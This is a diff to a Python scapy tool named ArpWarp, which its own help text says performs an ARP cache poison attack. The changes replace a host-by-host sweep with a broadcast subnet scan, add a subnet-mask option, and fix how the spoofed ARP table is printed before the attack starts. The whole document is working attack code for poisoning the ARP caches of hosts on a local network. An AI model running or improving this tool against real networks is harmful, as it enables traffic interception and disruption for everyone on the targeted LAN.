@@ -26,11 +26,14 @@ banner = """
 ../_/...\_\_|..|_|.....\_/\_/.\____|_|..|_|......
 """
 
-class ArpWarp:
-    _P_TIMEOUT = 0.5
 
-    def __init__(self, iface):
+class ArpWarp:
+    _P_TIMEOUT = 2
+    _DEF_CIDR = 24 # todo argparse
+
+    def __init__(self, iface, cidr):
         self.network_interface = iface
+        self.cidr = cidr
 
         self.my_mac = Ether().src
         self.my_private_ip = get_if_addr(self.network_interface)
@@ -38,29 +41,32 @@ class ArpWarp:
         self.arp_poison_interval = 1
 
         self.subnet = self.my_private_ip.split(".")[:3]
-        self.subnet_range = range(0, 256)
 
         self.original_arp_cache = self.generate_original_cache()
+        if not len(self.original_arp_cache):
+            raise Exception("No hosts were found on the network")
         self.poisoned_arp_cache = self.generate_poisoned_cache()
 
         self.abort = False
 
     def generate_original_cache(self) -> Dict[str, str]:
-        print(f"[*] Generating original ARP table for subnet {'.'.join(self.subnet)}.x, this might take 2-3 minutes...")
         arp_cache = dict()
+        print(f"[*] Generating original ARP table for subnet {'.'.join(self.subnet)}.x, this might take 1-2 minutes...")
 
-        for host_p in self.subnet_range:
-            t_ip = ".".join(self.subnet + [str(host_p)])
-            if t_ip != self.my_private_ip:
-                res = self.send_arp_packet(iface=self.network_interface,
-                                           op=1,
-                                           psrc=self.my_private_ip,
-                                           hwsrc=self.my_mac,
-                                           pdst=t_ip,
-                                           await_res=True)
-                if res:
-                    print(f"[+] HOST IS UP {t_ip} -> {res[ARP].hwsrc}")
-                    arp_cache[t_ip] = res[ARP].hwsrc
+        subnet = ".".join(self.subnet + ["0"])
+        arp_request = ARP(pdst=f"{subnet}/{self.cidr}")
+        broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
+        arp_request_broadcast = broadcast / arp_request
+        answered_list = srp(arp_request_broadcast, timeout=2)[0]
+
+        for _ in range(3):  # perform several scans
+            for element in answered_list:
+                h_ip, h_mac = element[1][ARP].psrc, element[1][ARP].hwsrc
+                if h_ip != self.my_private_ip and h_ip not in arp_cache:
+                    print(f"[+] HOST IS UP {h_ip} -> {h_mac}")
+                    arp_cache[h_ip] = h_mac
+            time.sleep(5)
+
         print(f"[*] Finished generating original ARP table...")
         return arp_cache
 
@@ -76,7 +82,7 @@ class ArpWarp:
         for index, host_ip in enumerate(self.original_arp_cache.keys()):
             poisoned_table[host_ip] = spoofed_values[index]
             print(f"[*] Host {host_ip}\toriginal {self.original_arp_cache[host_ip]}"
-                  f"\t spoofed {self.poisoned_arp_cache[host_ip]}")
+                  f"\t spoofed {poisoned_table[host_ip]}")
 
         print(f"[*] Poisoned ARP table is ready")
         return poisoned_table
@@ -143,9 +149,14 @@ if __name__ == "__main__":
     parser = argparse.ArgumentParser(description=f'Perform an ARP cache poison attack',
                                      usage=f"./{os.path.basename(__file__)} iface")
     parser.add_argument("-i", "--network-interface", dest='iface', type=str, metavar=(""),
-                        help="the name of the network interface (from `ifconfig`, i.e -> 'eth0')")
+                        help="the name of the network interface (from `ifconfig`, i.e -> 'eth0')",
+                        required=True)
+
+    parser.add_argument("-m", "--set-mask", dest='mask', type=int, metavar=(""), default=24,
+                        help="set the mask range (default -> /24 which means 0-256",
+                        required=False)
     arguments = parser.parse_args()
 
     print(f"[*] Setting up a new attacker...")
-    warper = ArpWarp(arguments.iface)
+    warper = ArpWarp(arguments.iface, arguments.mask)
     warper.start_attack()
